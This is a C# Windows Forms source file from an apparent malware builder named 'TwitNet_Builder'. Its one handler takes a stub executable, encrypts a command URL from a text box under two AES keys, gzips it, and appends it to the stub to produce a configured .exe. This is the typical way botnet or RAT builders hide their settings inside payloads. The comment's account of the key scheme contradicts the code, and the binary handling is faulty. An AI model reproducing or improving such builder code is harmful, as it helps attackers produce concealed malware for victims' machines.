using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using TwitNet_Builder.Util.Compression;
using TwitNet_Builder.Util.Encryption;

namespace TwitNet_Builder
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void Button1Click(object sender, EventArgs e)
        {
            //We find the file name to save as
            SaveFileDialog StubSaveDialog = new SaveFileDialog {
                           Filter = "EXE File(*.exe)|*.exe",
                           InitialDirectory = Application.StartupPath,
                           Title = "Save Stub As..." };
            StubSaveDialog.ShowDialog();

            //We load the stub and config data (just a url for now)
            Constants.CustomEncryptionKey = EncryptKeyBox.Text;
            byte[] stub = File.ReadAllBytes(Constants.StubFileName);
            string appendData = Regex.Split(CodePadBox.Text, "http://")[1].Split('.')[0];

            /*
             * K so im going to try and document this well since you are high:
             * There are two encryption keys, a default one and a custom one the user sets.
             * Basically it takes the config (right now just a URL) and encrypts it with the user's
             * custom key. Then it makes appendData = Splitter + (Encrypted Config) + Splitter + (Custom Encryption Key)
             * After that it encrypts appendData with the default key. From the stub, you can decrypt with the
             * default key, look for the custom key after the last splitter, then decrypt the config.
             * This is probably the safest way of doing it. To make it easier for the stub to find the
             * encrypted data, you might want to uncomment the last appendData assertion
             * which just adds a splitter before all of this.
             */
            //We run fancy encryption (check for documentation)
            SimpleAES defaultAES = new SimpleAES();

            defaultAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
            appendData = defaultAES.EncryptToString(appendData) + Constants.Splitter + Constants.DefaultEncryptionKey;
            
            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
            appendData = defaultAES.EncryptToString(appendData);
            appendData = Constants.Splitter + appendData;

            //We write the original stub exe + a GZipped appendData
            StreamWriter writer = new StreamWriter(StubSaveDialog.FileName, false, Encoding.Default);
            writer.AutoFlush = true;
            writer.Write(Encoding.Default.GetString(stub));
            writer.Write(Encoding.Default.GetString(GZip.CompressData(Encoding.Default.GetBytes(appendData))));
            writer.Close();

            MessageBox.Show("Completed");
        }
    }
}
